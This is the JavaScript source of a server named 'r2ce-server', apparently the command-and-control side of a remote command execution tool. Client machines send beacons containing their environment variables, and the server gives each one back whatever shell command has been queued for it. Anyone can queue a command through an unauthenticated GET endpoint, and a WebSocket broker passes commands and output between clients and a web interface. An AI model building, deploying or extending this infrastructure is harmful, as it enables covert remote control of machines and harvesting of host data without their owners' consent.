const { v4: uuidv4 } = require('uuid');
const express = require('express');
const ws = require('ws');
const path = require('path');

const _port = 6022;
const _app = express();
const _actions = { listjoins: 'listjoins', join: 'join', forward: 'forward', respond: 'respond', leave: 'leave', id: 'id' };
const _target = { server: 'server', web: 'web' };
const _activePulseList = {};
const _pendingCommands = {};
const _activeSocketConnections = {};
const _joinsBySocketId = {};
const _joinsByTargetId = {};

_app.use('/static', express.static(path.join(__dirname, 'public')))
_app.use(express.json());

_app.use((req, res, next) => {
    console.log(`@(${new Date().toISOString()}) | [${req.ip}] ${req.method} ${req.url}`);
    next();
});

_app.get('/', (req, res) => {
    res.send('r2ce-server');
});

_app.get('/favicon.ico', (req, res) => {
    res.sendStatus(200);
});

_app.get('/command/pending', (req, res) => {
    res.send(_pendingCommands);
});

_app.get('/command/:hostname/:cmd', (req, res) => {
    if (_activePulseList[req.params.hostname]) {
        _pendingCommands[req.params.hostname] = { command: req.params.cmd, id: uuidv4() };
        res.sendStatus(201);
    }
    else {
        res.sendStatus(406);
    }
});

_app.get('/pulse/list', (req, res) => {
    res.send(_activePulseList);
});

_app.post('/pulse', (req, res) => {
    console.log(`>> incoming pulse from ${req.body.COMPUTERNAME} @ ${req.body.HOMEPATH}`);

    _activePulseList[req.body.COMPUTERNAME] = {
        env: req.body,
        expires: Date.now() + 60 * 1000
    };

    const pendingCommand = _pendingCommands[req.body.COMPUTERNAME];
    if (pendingCommand) {
        delete _pendingCommands[req.body.COMPUTERNAME];
        res.status(201).header('cid', pendingCommand.id).send(pendingCommand.command);
    }
    else {
        res.sendStatus(204);
    }
});

const addSocketConnection = (socket) => {
    _activeSocketConnections[socket.id] = socket;
}

const removeSocketConnection = (socketId) => {
    delete _activeSocketConnections[socketId];
    removeJoinedTarget(socketId);
}

const addJoinedTarget = (socketId, target) => {
    _joinsBySocketId[socketId] = target;
    _joinsByTargetId[target] = socketId;
}

const removeJoinedTarget = (socketId) => {
    let target = _joinsBySocketId[socketId];
    delete _joinsByTargetId[target];
    delete _joinsBySocketId[socketId];
}

const checkSocketConnections = () => {
    wss.clients.forEach(function each(socket) {
        if (socket.isAlive === false) {
            removeSocketConnection(socket.id);
            return socket.terminate();
        }

        socket.isAlive = false;
        socket.ping(noop);
    });
}

const handleMessageBroker = (socket, data) => {
    console.log(`+    socket.message [${socket.id}]: ${data}`);
    //// action<<<target<<<payload
    /// actions: join, leave, forward, respond
    /// target: server, web, socket.id

    // join<<<server<<<identifier_name
    // leave<<<server<<<identifier_name

    // forward<<<socket_id<<<command_text
    // respond<<<hostname<<<command_text


    const args = data.split('<<<');
    const action = args[0];
    const target = args[1];
    const payload = args[2];

    let targetSocketId, targetSocket;

    switch (action) {
        case _actions.join:
            // add to join target list
            addJoinedTarget(socket.id, payload);

            targetSocketId = _joinsByTargetId[_target.web];

            if (!targetSocketId) {
                return;
            }

            // notify web for all sockets for first web join
            if (_target.web === payload) {
                const targetInfoList = [...wss.clients].map(s => {
                    return {
                        id: s.id,
                        name: _joinsBySocketId[s.id]
                    }
                });

                socket.send(`${_actions.listjoins}<<<${socket.id}<<<${JSON.stringify(targetInfoList)}`);
                return;
            }

            targetSocket = _activeSocketConnections[targetSocketId];
            const info = { id: socket.id, name: payload };
            targetSocket.send(`${action}<<<${socket.id}<<<${JSON.stringify(info)}`);

            console.log(`+    socket.message: ${action} -- id:[${socket.id}] | name:${payload}`);
            break;

        case _actions.forward:
            // forward command to r2ce client
            targetSocket = _activeSocketConnections[target];

            if (!targetSocket) {
                return;
            }

            targetSocket.send(`${action}<<<${socket.id}<<<${payload}`);

            console.log(`+    socket.message: ${action} -- [${_joinsBySocketId[socket.id]}] >> ${target}`);
            break;

        case _actions.respond:
            // respond r2ce client to webui
            targetSocketId = _joinsByTargetId[_target.web];
            targetSocket = _activeSocketConnections[targetSocketId];

            if (!targetSocket) {
                return;
            }

            targetSocket.send(`${action}<<<${socket.id}<<<${payload}`);

            console.log(`+    socket.message: ${action} -- [${_joinsBySocketId[socket.id]}] >> ${targetSocketId}`);
            break;

        default:
            console.log(`+    socket.message: invalid -- ${data}`);
    }
}

const server = _app.listen(_port, () => {
    console.log(`r2ce-server @ http://localhost:${_port}`)
});

const wss = new ws.Server({ noServer: true });

wss.on('connection', (socket, request) => {
    socket.id = uuidv4();

    console.log(`+  wss.connection [${socket.id}]`);

    socket.send(`id<<<r2ce<<<${socket.id}`);
    addSocketConnection(socket);

    socket.on('message', (data) => {
        handleMessageBroker(socket, data);
    });

    socket.on('disconnect', () => {
        console.log(`+    socket.disconnected [${socket.id}]`);
    });
});

wss.on('close', (arg) => {
    console.log(`+  wss.close ${arg}}`);
});

server.on('upgrade', (request, socket, head) => {
    console.log(`server.upgrade`);
    wss.handleUpgrade(request, socket, head, socket => {
        wss.emit('connection', socket, request);
    });
});